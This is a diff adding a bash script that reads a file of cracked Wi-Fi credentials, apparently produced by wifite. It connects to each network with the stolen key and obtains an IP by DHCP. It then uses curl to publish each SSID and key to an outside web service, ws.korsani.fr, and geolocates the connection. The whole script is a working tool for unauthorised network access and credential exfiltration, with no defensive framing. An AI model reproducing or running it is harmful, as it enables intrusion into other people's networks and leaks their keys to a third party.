@@ -1,0 +1,99 @@
+#!/bin/bash
+source /usr/local/include/libkoca.sh
+koca_lockMe -q /tmp/$(basename "$0").lock 2
+gotRoot || echo 'Must be run as root'
+t=$(mktemp)
+connect_fail=$(mktemp)
+if=wlan0
+trap " rm -f $t $connect_fail" 0
+cracked=$HOME/cracked.csv
+WS_EXPIRATION=10
+function reset_if() {
+	local if=$1
+	dhclient -r $if
+	ifconfig $if 0.0.0.0
+	ifconfig $if down
+}
+function connect() {
+	ifconfig $if up
+	iw dev $if connect "$1" key 0:$2
+	for i in $(seq 0 10 100)
+	do
+		iwconfig $if | grep -q "ESSID:\"$1\"" && return 0
+		#iwconfig $if accespoints
+		sleep 1
+		#echo $i | dialog --gauge "$ssid" 8 40 0
+		koca_spin
+	done
+	echo
+	return 1
+}
+function wait_for_ip() {
+	for i in $(seq 1 10)
+	do
+		ifconfig $if | grep -q inet && return 0
+		sleep 1
+		koca_spin
+	done
+	echo
+	return 1
+}
+while [ "$1" != "" ]
+do
+	case $1 in
+		-u) export UPDATE_ME=yes;;
+	esac
+done
+reset_if $if
+echo "Waiting $cracked"
+while [ ! -e $cracked ]
+do
+	sleep 1
+done
+while true
+do
+	echo 'Waiting...'
+	for line in $(cat $cracked)
+	do
+		bssid=$(echo $line | cut -d ',' -f 1)
+		ssid=$(echo $line | cut -d ',' -f 3)
+		key=$(echo $line | cut -d ',' -f 4)
+		#echo $ssid $key
+		if egrep -q "^$ssid$" $t
+		then
+			#echo "$ssid already done"
+			sleep 10
+			continue
+		fi
+		if egrep -q "^$ssid$" $connect_fail
+		then
+			sleep 10
+			continue
+		fi
+		echo -n "Authenticating to $ssid  "
+		if connect $ssid $key $bssid
+		then
+			echo 'ok'
+			dhclient -1 $if
+			echo -n 'Getting ip  '
+			wait_for_ip || continue
+			echo 'ok'
+			#route add default gw 192.168.0.254
+			echo -n 'Publication ... '
+			curl -s "ws.korsani.fr/dazi/?_method=patch&expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
+			curl -s ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION -d $ssid=$key > /dev/null && echo 'ok' && echo $ssid >> $t
+			geoiplookup $(curl -s ws.korsani.fr/myip)
+			if [ -n "$UPDATE_ME" ]
+			then
+				echo 'Updating myself'
+				apt-get update > /dev/null
+				apt-get -y upgrade > /dev/null
+				$HOME/bin/wifite.py --update >/dev/null
+			fi
+			reset_if $if
+		else
+			echo 'failed'
+			echo $ssid >> $connect_fail
+		fi
+	done
+done
